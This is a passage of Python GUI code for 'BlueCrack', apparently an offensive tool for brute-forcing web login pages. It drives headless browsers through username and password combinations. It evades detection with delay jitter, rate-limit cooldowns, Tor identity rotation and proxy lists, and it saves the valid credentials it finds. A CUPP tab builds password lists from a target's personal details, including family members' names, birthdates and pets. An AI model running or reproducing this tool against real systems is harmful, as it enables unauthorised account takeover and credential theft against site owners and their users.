            _save_json_report(
                "bluecrack_gui_report.json",
                ctx["target_url"],
                metrics,
                found_creds,
                self._start_time,
                end_time,
            )

            if found_users:
                saved_msg = f"Valid credentials found for {len(found_users)} user(s)! Saved to credentials.txt"
                self.finished_signal.emit(True, saved_msg)
            elif self._stop_flag.is_set() or _GLOBAL_STOP.is_set():
                self.finished_signal.emit(False, "Stopped by user.")
            else:
                self.finished_signal.emit(False, "No valid credentials found.")

        def _emit_metrics(self, metrics: Dict[str, int]) -> None:
            """Emit a copy of the current metrics to the GUI."""
            m = dict(metrics)
            m["elapsed"] = time.time() - self._start_time if self._start_time else 0
            self.metrics_signal.emit(m)

    # ─────────────────── CUPP Worker Thread ───────────────────
    class CuppWorkerThread(QThread):
        """Worker thread for CUPP password profile generation."""

        log_signal = pyqtSignal(str)
        finished_signal = pyqtSignal(str)  # path to generated file

        def __init__(self, profile: Dict[str, Any]) -> None:
            super().__init__()
            self.profile: Dict[str, Any] = profile

        def run(self) -> None:
            """Generate a CUPP wordlist from the given profile."""
            try:
                if _cupp_mod is None:
                    self.log_signal.emit("[-] cupp.py not found in directory.")
                    self.finished_signal.emit("")
                    return
                _cupp_mod.read_config(os.path.join(_cupp_dir, "cupp.cfg"))
                self.log_signal.emit("[*] Generating CUPP wordlist...")
                p = self.profile
                p.setdefault("spechars1", "n")
                p.setdefault("randnum", "n")
                p.setdefault("leetmode", "n")

                # Mock builtins.input to prevent CUPP from hanging
                original_input = builtins.input
                builtins.input = lambda prompt="": "n"
                try:
                    _cupp_mod.generate_wordlist_from_profile(p)
                finally:
                    builtins.input = original_input

                outfile = p["name"] + ".txt"
                if os.path.exists(outfile):
                    with open(outfile) as f:
                        cnt = sum(1 for _ in f)
                    self.log_signal.emit(
                        f"[+] CUPP done! {cnt} passwords → {outfile}"
                    )
                    self.finished_signal.emit(os.path.abspath(outfile))
                else:
                    self.log_signal.emit("[-] CUPP generated no output.")
                    self.finished_signal.emit("")
            except Exception as e:
                self.log_signal.emit(f"[-] CUPP error: {e}")
                self.finished_signal.emit("")

    # ─────────────────── Main GUI Window ───────────────────
    class BlueCrackGUI(QWidget):
        """Main BlueCrack GUI window with tabbed interface and live stats."""

        def __init__(self) -> None:
            super().__init__()
            self.worker_thread: Optional[GuiWorkerThread] = None
            self._cupp_thread: Optional[CuppWorkerThread] = None
            self._cupp_result_path: str = ""
            self._attack_start_time: float = 0.0
            self._is_dark: bool = True
            self.setWindowTitle(f"BlueCrack v{__version__}")
            self.setMinimumSize(960, 780)
            self._build_ui()

        def _build_ui(self) -> None:
            """Construct the entire GUI layout."""
            root = QVBoxLayout(self)
            root.setContentsMargins(18, 14, 18, 14)
            root.setSpacing(8)

            # ── Header Frame ──
            header_frame = QFrame()
            header_frame.setStyleSheet(
                "QFrame { background: transparent; border: none; }"
            )
            header_layout = QHBoxLayout(header_frame)
            header_layout.setContentsMargins(0, 0, 0, 4)

            title_col = QVBoxLayout()
            title = QLabel("BLUECRACK")
            title.setObjectName("titleLabel")
            title.setAlignment(Qt.AlignmentFlag.AlignLeft)
            sub = QLabel(
                f"v{__version__}  ·  Advanced Browser Penetration Framework"
            )
            sub.setObjectName("subtitleLabel")
            sub.setAlignment(Qt.AlignmentFlag.AlignLeft)
            title_col.addWidget(title)
            title_col.addWidget(sub)
            header_layout.addLayout(title_col, stretch=1)

            self.theme_btn = QPushButton("☀")
            self.theme_btn.setFixedSize(36, 36)
            self.theme_btn.setToolTip("Toggle light/dark theme")
            self.theme_btn.setStyleSheet(
                "QPushButton { font-size: 18px; border-radius: 18px; }"
            )
            self.theme_btn.clicked.connect(self._toggle_theme)
            header_layout.addWidget(
                self.theme_btn, alignment=Qt.AlignmentFlag.AlignTop
            )
            root.addWidget(header_frame)

            # ── Splitter: Tabs on top, Log on bottom ──
            self.splitter = QSplitter(Qt.Orientation.Vertical)

            # ── Tabs ──
            self.tabs = QTabWidget()

            # ═══ TAB 1 : Target ═══
            tgt_scroll = QScrollArea()
            tgt_scroll.setWidgetResizable(True)
            tgt_scroll.setFrameShape(QFrame.Shape.NoFrame)
            tgt_w = QWidget()
            tgt_l = QVBoxLayout(tgt_w)
            tgt_l.setSpacing(6)

            tgt_grp = QGroupBox("  Target Configuration")
            tgt_grp.setSizePolicy(
                QSizePolicy.Policy.Preferred, QSizePolicy.Policy.Maximum
            )
            tgt_f = QFormLayout(tgt_grp)
            tgt_f.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
            tgt_f.setFormAlignment(
                Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop
            )
            tgt_f.setHorizontalSpacing(12)
            tgt_f.setVerticalSpacing(12)

            self.url_in = QLineEdit()
            self.url_in.setPlaceholderText("https://target.com/login")
            self.url_in.setToolTip(
                "The full URL of the login page to attack"
            )
            tgt_f.addRow("URL:", self.url_in)

            user_row = QHBoxLayout()
            self.user_in = QLineEdit()
            self.user_in.setPlaceholderText("admin  or  path/to/users.txt")
            self.user_in.setToolTip(
                "A single username OR path to a file with one username per line"
            )
            user_btn = QPushButton("📂")
            user_btn.setFixedWidth(36)
            user_btn.setToolTip("Browse for username list file")
            user_btn.clicked.connect(lambda: self._pick_file(self.user_in))
            user_row.addWidget(self.user_in)
            user_row.addWidget(user_btn)
            tgt_f.addRow("Username / File:", user_row)

            pass_row = QHBoxLayout()
            self.pass_in = QLineEdit()
            self.pass_in.setPlaceholderText("password  or  path/to/pass.txt")
            self.pass_in.setToolTip(
                "A single password OR path to a file with one password per line"
            )
            pass_btn = QPushButton("📂")
            pass_btn.setFixedWidth(36)
            pass_btn.setToolTip("Browse for password list file")
            pass_btn.clicked.connect(lambda: self._pick_file(self.pass_in))
            pass_row.addWidget(self.pass_in)
            pass_row.addWidget(pass_btn)
            tgt_f.addRow("Password / File:", pass_row)
            tgt_l.addWidget(tgt_grp)
            tgt_l.addStretch()
            tgt_scroll.setWidget(tgt_w)

            self.tabs.addTab(tgt_scroll, "🎯  Target")

            # ═══ TAB 2 : Engine ═══
            eng_scroll = QScrollArea()
            eng_scroll.setWidgetResizable(True)
            eng_scroll.setFrameShape(QFrame.Shape.NoFrame)
            eng_w = QWidget()
            eng_l = QVBoxLayout(eng_w)
            eng_l.setSpacing(6)

            eng_grp = QGroupBox("  Engine Settings")
            eng_grp.setSizePolicy(
                QSizePolicy.Policy.Preferred, QSizePolicy.Policy.Maximum
            )
            eng_f = QFormLayout(eng_grp)
            eng_f.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
            eng_f.setFormAlignment(
                Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop
            )
            eng_f.setHorizontalSpacing(12)
            eng_f.setVerticalSpacing(12)

            self.threads_in = QSpinBox()
            self.threads_in.setRange(1, 50)
            self.threads_in.setValue(1)
            self.threads_in.setToolTip(
                "Number of parallel browser threads (more = faster but heavier)"
            )

            self.delay_in = QDoubleSpinBox()
            self.delay_in.setRange(0, 120)
            self.delay_in.setSingleStep(0.5)
            self.delay_in.setToolTip(
                "Base delay in seconds between each login attempt"
            )

            self.jitter_in = QDoubleSpinBox()
            self.jitter_in.setRange(0, 30)
            self.jitter_in.setSingleStep(0.5)
            self.jitter_in.setToolTip(
                "Random jitter added to delay to avoid pattern detection"
            )

            self.err_in = QLineEdit("incorrect")
            self.err_in.setPlaceholderText("error text on failed login")
            self.err_in.setToolTip(
                "Text that appears on the page when a login fails (e.g. 'invalid password')"
            )

            self.limit_in = QLineEdit(DEFAULT_LIMIT_TEXT)
            self.limit_in.setToolTip(
                "Text indicating the server is rate-limiting requests"
            )

            self.cooldown_in = QSpinBox()
            self.cooldown_in.setRange(0, 300)
            self.cooldown_in.setValue(12)
            self.cooldown_in.setToolTip(
                "Seconds to wait when a rate limit is detected before retrying"
            )

            self.headless_cb = QCheckBox("Headless browsers (no visible window)")
            self.headless_cb.setChecked(True)
            self.headless_cb.setToolTip(
                "Run browsers without visible windows — faster but no visual feedback"
            )

            eng_f.addRow("Threads:", self.threads_in)
            eng_f.addRow("Delay (s):", self.delay_in)
            eng_f.addRow("Jitter (s):", self.jitter_in)
            eng_f.addRow("Error text:", self.err_in)
            eng_f.addRow("Rate-limit text:", self.limit_in)
            eng_f.addRow("Cooldown (s):", self.cooldown_in)
            eng_f.addRow("", self.headless_cb)
            eng_l.addWidget(eng_grp)

            # ── Advanced Options GroupBox ──
            adv_grp = QGroupBox("  Advanced Options")
            adv_grp.setSizePolicy(
                QSizePolicy.Policy.Preferred, QSizePolicy.Policy.Maximum
            )
            adv_f = QFormLayout(adv_grp)
            adv_f.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
            adv_f.setFormAlignment(
                Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop
            )
            adv_f.setHorizontalSpacing(12)
            adv_f.setVerticalSpacing(12)

            self.success_in = QLineEdit()
            self.success_in.setPlaceholderText("e.g. 'Welcome back' or 'Dashboard'")
            self.success_in.setToolTip(
                "Text that confirms a successful login. If set, login is only valid when this text appears."
            )

            self.max_attempts_in = QSpinBox()
            self.max_attempts_in.setRange(0, 999999)
            self.max_attempts_in.setValue(0)
            self.max_attempts_in.setToolTip(
                "Maximum total attempts before stopping (0 = unlimited)"
            )

            self.continue_cb = QCheckBox("Continue testing after finding credentials")
            self.continue_cb.setToolTip(
                "If checked, the attack continues even after finding valid credentials"
            )

            adv_f.addRow("Success text:", self.success_in)
            adv_f.addRow("Max attempts:", self.max_attempts_in)
            adv_f.addRow("", self.continue_cb)
            eng_l.addWidget(adv_grp)

            eng_l.addStretch()
            eng_scroll.setWidget(eng_w)

            self.tabs.addTab(eng_scroll, "⚙  Engine")

            # ═══ TAB 3 : Network / Tor ═══
            net_scroll = QScrollArea()
            net_scroll.setWidgetResizable(True)
            net_scroll.setFrameShape(QFrame.Shape.NoFrame)
            net_w = QWidget()
            net_l = QVBoxLayout(net_w)
            net_l.setSpacing(6)

            net_grp = QGroupBox("  Network / Tor Proxy")
            net_grp.setSizePolicy(
                QSizePolicy.Policy.Preferred, QSizePolicy.Policy.Maximum
            )
            net_f = QFormLayout(net_grp)
            net_f.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
            net_f.setFormAlignment(
                Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop
            )
            net_f.setHorizontalSpacing(12)
            net_f.setVerticalSpacing(12)

            self.tor_cb = QCheckBox("Route through Tor  (socks5://127.0.0.1:9050)")
            self.tor_cb.setToolTip(
                "Route all traffic through the Tor network for anonymity"
            )

            self.tor_port_in = QSpinBox()
            self.tor_port_in.setRange(1024, 65535)
            self.tor_port_in.setValue(9051)
            self.tor_port_in.setToolTip(
                "Tor control port for requesting new identities"
            )

            self.tor_every_in = QSpinBox()
            self.tor_every_in.setRange(0, 9999)
            self.tor_every_in.setValue(10)
            self.tor_every_in.setToolTip(
                "Shift Tor IP every N attempts. 0 = never shift."
            )

            self.proxy_in = QLineEdit()
            self.proxy_in.setPlaceholderText(
                "http://ip:port  or  path/to/proxies.txt"
            )
            self.proxy_in.setToolTip(
                "A single proxy URL or path to a file with one proxy per line"
            )
            proxy_btn = QPushButton("📂")
            proxy_btn.setFixedWidth(36)
            proxy_btn.setToolTip("Browse for proxy list file")
            proxy_btn.clicked.connect(lambda: self._pick_file(self.proxy_in))
            proxy_row = QHBoxLayout()
            proxy_row.addWidget(self.proxy_in)
            proxy_row.addWidget(proxy_btn)

            net_f.addRow("", self.tor_cb)
            net_f.addRow("Tor Ctrl Port:", self.tor_port_in)
            net_f.addRow("Shift IP every:", self.tor_every_in)
            net_f.addRow("Proxy / File:", proxy_row)

            net_l.addWidget(net_grp)
            net_l.addStretch()
            net_scroll.setWidget(net_w)

            self.tabs.addTab(net_scroll, "🧅  Network")

            # ═══ TAB 4 : CUPP Wordlist Generator ═══
            cupp_scroll = QScrollArea()
            cupp_scroll.setWidgetResizable(True)
            cupp_scroll.setFrameShape(QFrame.Shape.NoFrame)
            cupp_w = QWidget()
            cupp_l = QVBoxLayout(cupp_w)
            cupp_l.setSpacing(6)

            cupp_grp = QGroupBox("  CUPP — Common User Passwords Profiler")
            cupp_f = QFormLayout(cupp_grp)
            cupp_f.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
            cupp_f.setFormAlignment(
                Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop
            )
            cupp_f.setHorizontalSpacing(12)
            cupp_f.setVerticalSpacing(8)

            self.cupp_name = QLineEdit()
            self.cupp_name.setPlaceholderText("Required")
            self.cupp_name.setToolTip("Target's first name (required for CUPP)")
            self.cupp_surname = QLineEdit()
            self.cupp_surname.setToolTip("Target's surname / last name")
            self.cupp_nick = QLineEdit()
            self.cupp_nick.setToolTip("Target's nickname or alias")
            self.cupp_bday = QLineEdit()
            self.cupp_bday.setPlaceholderText("DDMMYYYY")
            self.cupp_bday.setToolTip("Target's birthdate in DDMMYYYY format")
            self.cupp_partner = QLineEdit()
            self.cupp_partner.setToolTip("Name of target's partner/spouse")
            self.cupp_partner_nick = QLineEdit()
            self.cupp_partner_nick.setToolTip("Partner's nickname")
            self.cupp_partner_bday = QLineEdit()
            self.cupp_partner_bday.setPlaceholderText("DDMMYYYY")
            self.cupp_partner_bday.setToolTip("Partner's birthdate in DDMMYYYY format")
            self.cupp_child = QLineEdit()
            self.cupp_child.setToolTip("Name of target's child")
            self.cupp_child_nick = QLineEdit()
            self.cupp_child_nick.setToolTip("Child's nickname")
            self.cupp_child_bday = QLineEdit()
            self.cupp_child_bday.setPlaceholderText("DDMMYYYY")
            self.cupp_child_bday.setToolTip("Child's birthdate in DDMMYYYY format")
            self.cupp_pet = QLineEdit()
            self.cupp_pet.setToolTip("Name of target's pet")
            self.cupp_company = QLineEdit()
            self.cupp_company.setToolTip("Target's company or employer name")
            self.cupp_keywords = QLineEdit()
            self.cupp_keywords.setPlaceholderText("hacker,juice,black")
            self.cupp_keywords.setToolTip(
                "Comma-separated keywords related to the target"
            )
            self.cupp_specchars = QCheckBox("Add special chars")
            self.cupp_specchars.setToolTip("Append special characters to generated passwords")
            self.cupp_randnum = QCheckBox("Add random numbers")
            self.cupp_randnum.setToolTip("Append random numbers to generated passwords")
            self.cupp_leet = QCheckBox("1337 mode")
            self.cupp_leet.setToolTip("Convert letters to leet-speak equivalents")

            cupp_f.addRow("First Name *:", self.cupp_name)
            cupp_f.addRow("Surname:", self.cupp_surname)
            cupp_f.addRow("Nickname:", self.cupp_nick)
            cupp_f.addRow("Birthdate:", self.cupp_bday)
            cupp_f.addRow("Partner Name:", self.cupp_partner)
            cupp_f.addRow("Partner Nick:", self.cupp_partner_nick)
            cupp_f.addRow("Partner Bday:", self.cupp_partner_bday)
            cupp_f.addRow("Child Name:", self.cupp_child)
            cupp_f.addRow("Child Nick:", self.cupp_child_nick)
            cupp_f.addRow("Child Bday:", self.cupp_child_bday)
            cupp_f.addRow("Pet Name:", self.cupp_pet)
            cupp_f.addRow("Company:", self.cupp_company)
            cupp_f.addRow("Keywords:", self.cupp_keywords)
            cupp_f.addRow("", self.cupp_specchars)
            cupp_f.addRow("", self.cupp_randnum)
            cupp_f.addRow("", self.cupp_leet)
            cupp_l.addWidget(cupp_grp)

            # Number Sequence generator
            seq_grp = QGroupBox(
                "  Number Sequence Generator (e.g. 2015001 to 2015002)"
            )
            seq_grp.setSizePolicy(
                QSizePolicy.Policy.Preferred, QSizePolicy.Policy.Maximum
            )
            seq_f = QFormLayout(seq_grp)
            seq_f.setLabelAlignment(Qt.AlignmentFlag.AlignRight)
            seq_f.setFormAlignment(
                Qt.AlignmentFlag.AlignLeft | Qt.AlignmentFlag.AlignTop
            )
            seq_f.setHorizontalSpacing(12)
            seq_f.setVerticalSpacing(8)

            self.seq_prefix = QLineEdit()
            self.seq_prefix.setPlaceholderText("Prefix (optional)")
            self.seq_prefix.setToolTip("Text prepended before each number")
            self.seq_start = QSpinBox()
            self.seq_start.setRange(0, 999999999)
            self.seq_start.setValue(2015000)
            self.seq_start.setToolTip("Starting number of the sequence")
            self.seq_end = QSpinBox()
            self.seq_end.setRange(0, 999999999)
            self.seq_end.setValue(2015100)
            self.seq_end.setToolTip("Ending number of the sequence (inclusive)")
            self.seq_pad = QSpinBox()
            self.seq_pad.setRange(0, 20)
            self.seq_pad.setToolTip(
                "Pad numbers with leading zeros to this width"
            )
            self.seq_suffix = QLineEdit()
            self.seq_suffix.setPlaceholderText("Suffix (optional)")
            self.seq_suffix.setToolTip("Text appended after each number")

            seq_f.addRow("Prefix:", self.seq_prefix)
            seq_f.addRow("Start Number:", self.seq_start)
            seq_f.addRow("End Number:", self.seq_end)
            seq_f.addRow("Zero Padding:", self.seq_pad)
            seq_f.addRow("Suffix:", self.seq_suffix)
            cupp_l.addWidget(seq_grp)

            cupp_btns = QHBoxLayout()
            self.cupp_gen_btn = QPushButton("🧠  Generate CUPP Profile")
            self.cupp_gen_btn.setStyleSheet(
                "background: qlineargradient(x1:0,y1:0,x2:1,y2:0, stop:0 #b388ff, stop:1 #7c4dff);"
                " color: white; padding: 10px; font-size: 14px; border-radius: 8px; font-weight: bold;"
            )
            self.cupp_gen_btn.clicked.connect(self._run_cupp)

            self.seq_gen_btn = QPushButton("🔢  Generate Sequence")
            self.seq_gen_btn.setStyleSheet(
                "background: qlineargradient(x1:0,y1:0,x2:1,y2:0, stop:0 #4f8cff, stop:1 #1d4ed8);"
                " color: white; padding: 10px; font-size: 14px; border-radius: 8px; font-weight: bold;"
            )
            self.seq_gen_btn.clicked.connect(self._run_sequence)

            self.cupp_use_btn = QPushButton("📋  Use as Password List")
            self.cupp_use_btn.setEnabled(False)
            self.cupp_use_btn.clicked.connect(self._use_cupp_result)

            cupp_btns.addWidget(self.cupp_gen_btn)
            cupp_btns.addWidget(self.seq_gen_btn)
            cupp_btns.addWidget(self.cupp_use_btn)
            cupp_l.addLayout(cupp_btns)
            cupp_l.addStretch()
            cupp_scroll.setWidget(cupp_w)

            self.tabs.addTab(cupp_scroll, "🧠  CUPP")

            self.splitter.addWidget(self.tabs)

            # ── Log area ──
            self.log_txt = QTextEdit()
            self.log_txt.setReadOnly(True)
            self.log_txt.setMinimumHeight(80)
            self.splitter.addWidget(self.log_txt)

            self.splitter.setStretchFactor(0, 3)
            self.splitter.setStretchFactor(1, 1)
            root.addWidget(self.splitter, stretch=1)

            # ═══ Bottom Controls ═══
            ctrl_row = QHBoxLayout()
            self.start_btn = QPushButton("🚀  START ATTACK")
            self.start_btn.setStyleSheet(
                "QPushButton {"
                "  background: qlineargradient(x1:0,y1:0,x2:1,y2:0, stop:0 #00e676, stop:1 #00c853);"
                "  color: white; padding: 12px 28px; font-size: 15px;"
                "  font-weight: bold; border-radius: 10px; border: none;"
                "}"
                "QPushButton:hover {"
                "  background: qlineargradient(x1:0,y1:0,x2:1,y2:0, stop:0 #00c853, stop:1 #00a844);"
                "}"
                "QPushButton:disabled {"
                "  background: rgba(0, 230, 118, 0.2); color: rgba(255,255,255,0.3);"
                "}"
            )
            self.start_btn.clicked.connect(self._start_attack)

            self.stop_btn = QPushButton("⛔  STOP")
            self.stop_btn.setStyleSheet(
                "QPushButton {"
                "  background: qlineargradient(x1:0,y1:0,x2:1,y2:0, stop:0 #ff5252, stop:1 #d32f2f);"
                "  color: white; padding: 12px 28px; font-size: 15px;"
                "  font-weight: bold; border-radius: 10px; border: none;"
                "}"
                "QPushButton:hover {"
                "  background: qlineargradient(x1:0,y1:0,x2:1,y2:0, stop:0 #d32f2f, stop:1 #b71c1c);"
                "}"
                "QPushButton:disabled {"
                "  background: rgba(255, 82, 82, 0.2); color: rgba(255,255,255,0.3);"
                "}"
            )
            self.stop_btn.setEnabled(False)
            self.stop_btn.clicked.connect(self._stop_attack)

            self.clear_btn = QPushButton("🗑  Clear Log")
            self.clear_btn.setToolTip("Clear all log output")
            self.clear_btn.clicked.connect(lambda: self.log_txt.clear())

            self.export_btn = QPushButton("💾  Export Log")
            self.export_btn.setToolTip("Save the current log contents to a file")
            self.export_btn.clicked.connect(self._export_log)

            ctrl_row.addWidget(self.start_btn)
            ctrl_row.addWidget(self.stop_btn)
            ctrl_row.addStretch()
            ctrl_row.addWidget(self.export_btn)
            ctrl_row.addWidget(self.clear_btn)
            root.addLayout(ctrl_row)

            # ── Progress Bar ──
            self.progress = QProgressBar()
            self.progress.setValue(0)
            root.addWidget(self.progress)

            # ── Live Stats Footer ──
            footer_frame = QFrame()
            footer_frame.setStyleSheet(
                "QFrame {"
                "  background: rgba(15, 23, 42, 0.6);"
                "  border: 1px solid rgba(148, 163, 184, 0.1);"
                "  border-radius: 8px;"
                "  padding: 4px 8px;"
                "}"
            )
            footer_layout = QHBoxLayout(footer_frame)
            footer_layout.setContentsMargins(12, 6, 12, 6)
            footer_layout.setSpacing(24)

            def _make_stat(label_text: str, value_text: str) -> Tuple[QLabel, QLabel]:
                lbl = QLabel(label_text)
                lbl.setObjectName("statLabel")
                val = QLabel(value_text)
                val.setObjectName("statValue")
                return lbl, val

            elapsed_lbl, self.elapsed_val = _make_stat("⏱ Elapsed:", "00:00:00")
            speed_lbl, self.speed_val = _make_stat("⚡ Speed:", "0.0/s")
            eta_lbl, self.eta_val = _make_stat("📊 ETA:", "--:--:--")
            hits_lbl, self.hits_val = _make_stat("🎯 Hits:", "0")

            for lbl, val in [
                (elapsed_lbl, self.elapsed_val),
                (speed_lbl, self.speed_val),
                (eta_lbl, self.eta_val),
                (hits_lbl, self.hits_val),
            ]:
                pair = QHBoxLayout()
                pair.setSpacing(2)
                pair.addWidget(lbl)
                pair.addWidget(val)
                footer_layout.addLayout(pair)

            footer_layout.addStretch()
            root.addWidget(footer_frame)

            # ── Status bar line ──
            self.status_lbl = QLabel("Ready.")
            self.status_lbl.setStyleSheet(
                "color: #94a3b8; font-size: 11px; padding: 4px;"
            )
            root.addWidget(self.status_lbl)

            # ── Stats Timer ──
            self._stats_timer = QTimer(self)
            self._stats_timer.setInterval(1000)
            self._stats_timer.timeout.connect(self._update_elapsed)
            self._total_combos: int = 0
            self._current_metrics: Dict[str, Any] = {}

            # ── Keyboard shortcuts ──
            QShortcut(QKeySequence("Ctrl+X"), self, activated=self._stop_attack)

        # ── Helpers ──
        def _pick_file(self, target: QLineEdit) -> None:
            """Open a file dialog and set the selected file path into the target QLineEdit."""
            f, _ = QFileDialog.getOpenFileName(
                self, "Open File", "", "Text Files (*.txt);;All Files (*)"
            )
            if f:
                target.setText(f)

        def _log(self, msg: str) -> None:
            """Append a message to the log text area."""
            self.log_txt.append(msg)

        def _toggle_theme(self) -> None:
            """Toggle between dark and light themes."""
            app_inst = QApplication.instance()
            if app_inst is None:
                return
            if self._is_dark:
                app_inst.setStyleSheet(LIGHT_STYLE)
                self.theme_btn.setText("🌙")
                self._is_dark = False
            else:
                app_inst.setStyleSheet(DARK_STYLE)
                self.theme_btn.setText("☀")
                self._is_dark = True

        def _export_log(self) -> None:
            """Export the current log contents to a timestamped file."""
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            filename = f"bluecrack_log_{timestamp}.txt"
            try:
                content = self.log_txt.toPlainText()
                with open(filename, "w", encoding="utf-8") as f:
                    f.write(content)
                self._log(f"[+] Log exported to: {os.path.abspath(filename)}")
                self.status_lbl.setText(f"Log exported: {filename}")
            except Exception as e:
                self._log(f"[-] Export failed: {e}")

        def _update_elapsed(self) -> None:
            """Update the elapsed time label (called by timer every second)."""
            if self._attack_start_time > 0:
                elapsed = time.time() - self._attack_start_time
                h, rem = divmod(int(elapsed), 3600)
                m, s = divmod(rem, 60)
                self.elapsed_val.setText(f"{h:02d}:{m:02d}:{s:02d}")

                attempted = self._current_metrics.get("attempted", 0)
                if elapsed > 0 and attempted > 0:
                    rate = attempted / elapsed
                    self.speed_val.setText(f"{rate:.1f}/s")

                    remaining = self._total_combos - attempted
                    if rate > 0 and remaining > 0:
                        eta_sec = remaining / rate
                        eh, erem = divmod(int(eta_sec), 3600)
                        em, es = divmod(erem, 60)
                        self.eta_val.setText(f"{eh:02d}:{em:02d}:{es:02d}")
                    elif remaining <= 0:
                        self.eta_val.setText("00:00:00")

        def _on_metrics(self, metrics: Dict[str, Any]) -> None:
            """Handle metrics signal from the worker thread."""
            self._current_metrics = metrics
            self.hits_val.setText(str(metrics.get("successes", 0)))

        # ── CUPP ──
        def _run_cupp(self) -> None:
            """Launch a CUPP wordlist generation in a background thread."""
            name = self.cupp_name.text().strip()
            if not name:
                QMessageBox.warning(self, "CUPP", "First Name is required.")
                return
            profile: Dict[str, Any] = {
                "name": name.lower(),
                "surname": self.cupp_surname.text().strip().lower(),
                "nick": self.cupp_nick.text().strip().lower(),
                "birthdate": self.cupp_bday.text().strip(),
                "wife": self.cupp_partner.text().strip().lower(),
                "wifen": self.cupp_partner_nick.text().strip().lower(),
                "wifeb": self.cupp_partner_bday.text().strip(),
                "kid": self.cupp_child.text().strip().lower(),
                "kidn": self.cupp_child_nick.text().strip().lower(),
                "kidb": self.cupp_child_bday.text().strip(),
                "pet": self.cupp_pet.text().strip().lower(),
                "company": self.cupp_company.text().strip().lower(),
                "words": [
                    w.strip()
                    for w in self.cupp_keywords.text().split(",")
                    if w.strip()
                ]
                or [""],
                "spechars1": "y" if self.cupp_specchars.isChecked() else "n",
                "randnum": "y" if self.cupp_randnum.isChecked() else "n",
                "leetmode": "y" if self.cupp_leet.isChecked() else "n",
            }
            self.cupp_gen_btn.setEnabled(False)
            self.cupp_gen_btn.setText("⏳ Generating...")
            self._cupp_thread = CuppWorkerThread(profile)
            self._cupp_thread.log_signal.connect(self._log)
            self._cupp_thread.finished_signal.connect(self._cupp_done)
            self._cupp_thread.start()

        def _cupp_done(self, path: str) -> None:
            """Handle CUPP generation completion."""
            self.cupp_gen_btn.setEnabled(True)
            self.cupp_gen_btn.setText("🧠  Generate CUPP Profile")
            self._cupp_result_path = path
            if path:
                self.cupp_use_btn.setEnabled(True)
                self.status_lbl.setText(f"CUPP wordlist: {path}")

        def _run_sequence(self) -> None:
            """Generate a numeric sequence wordlist."""
            prefix = self.seq_prefix.text()
            suffix = self.seq_suffix.text()
            start = self.seq_start.value()
            end = self.seq_end.value()
            pad = self.seq_pad.value()

            if start > end:
                QMessageBox.warning(
                    self,
                    "Error",
                    "Start Number must be less than or equal to End Number.",
                )
                return

            self.seq_gen_btn.setEnabled(False)
            self.seq_gen_btn.setText("⏳ Generating...")

            try:
                out_path = os.path.abspath("sequence_wordlist.txt")
                with open(out_path, "w", encoding="utf-8") as f:
                    for i in range(start, end + 1):
                        num_str = str(i).zfill(pad)
                        f.write(f"{prefix}{num_str}{suffix}\n")

                self._log(
                    f"[+] Sequence wordlist generated! ({end - start + 1} passwords) → {out_path}"
                )
                self._cupp_result_path = out_path
                self.cupp_use_btn.setEnabled(True)
                self.status_lbl.setText(f"Sequence wordlist: {out_path}")
            except Exception as e:
                self._log(f"[-] Sequence generation error: {e}")
            finally:
                self.seq_gen_btn.setEnabled(True)
                self.seq_gen_btn.setText("🔢  Generate Sequence")

        def _use_cupp_result(self) -> None:
            """Copy the CUPP result path to the password input field."""
            if self._cupp_result_path:
                self.pass_in.setText(self._cupp_result_path)
                self.tabs.setCurrentIndex(0)
                self._log(f"[+] Password list set to: {self._cupp_result_path}")

        # ── Attack ──
        def _start_attack(self) -> None:
            """Validate inputs and launch the attack worker thread."""
            url = self.url_in.text().strip()
            if not url:
                QMessageBox.critical(self, "Error", "Enter a Target URL.")
                return
            if not url.startswith("http"):
                url = "http://" + url

            up = self.user_in.text().strip()
            users: List[str] = []
            if os.path.isfile(up):
                with open(up, encoding="utf-8", errors="ignore") as f:
                    users = [x.strip() for x in f if x.strip()]
            elif up:
                users = [up]

            pp = self.pass_in.text().strip()
            passwords: List[str] = []
            if os.path.isfile(pp):
                with open(pp, encoding="utf-8", errors="ignore") as f:
                    passwords = [x.strip() for x in f if x.strip()]
            elif pp:
                passwords = [pp]

            if not users or not passwords:
                QMessageBox.critical(
                    self, "Error", "Provide valid user and password input."
                )
                return

            proxies_list: List[str] = []
            px = self.proxy_in.text().strip()
            if os.path.isfile(px):
                with open(px, encoding="utf-8", errors="ignore") as f:
                    proxies_list = [x.strip() for x in f if x.strip()]
            elif px:
                proxies_list = [px]

            ctx: Dict[str, Any] = {
                "target_url": url,
                "users": users,
                "passwords": passwords,
                "threads": self.threads_in.value(),
                "delay": self.delay_in.value(),
                "jitter": self.jitter_in.value(),
                "error_msg": self.err_in.text().strip().lower(),
                "limit_text": self.limit_in.text().strip().lower(),
                "cooldown": self.cooldown_in.value(),
                "headless": self.headless_cb.isChecked(),
                "proxies": proxies_list,
                "use_tor": self.tor_cb.isChecked(),
                "tor_port": self.tor_port_in.value(),
                "tor_shift_every": self.tor_every_in.value(),
                "success_msg": self.success_in.text().strip(),
                "max_attempts": self.max_attempts_in.value(),
                "continue_after_success": self.continue_cb.isChecked(),
            }

            total = len(users) * len(passwords)
            self._total_combos = total
            self.progress.setMaximum(total)
            self.progress.setValue(0)
            self.progress.setStyleSheet("")  # Reset any custom style
            self.log_txt.clear()
            self._log(f"[*] Target: {url}")
            self._log(
                f"[*] {len(users)} user(s)  ×  {len(passwords)} password(s)  =  {total} combos"
            )
            self._log(
                f"[*] Threads: {ctx['threads']}   Tor: {'ON' if ctx['use_tor'] else 'OFF'}"
            )
            if ctx["success_msg"]:
                self._log(f"[*] Success text: '{ctx['success_msg']}'")
            if ctx["max_attempts"] > 0:
                self._log(f"[*] Max attempts: {ctx['max_attempts']}")

            self.start_btn.setEnabled(False)
            self.stop_btn.setEnabled(True)
            self.status_lbl.setText("Running...")

            # Reset footer stats
            self._attack_start_time = time.time()
            self._current_metrics = {}
            self.elapsed_val.setText("00:00:00")
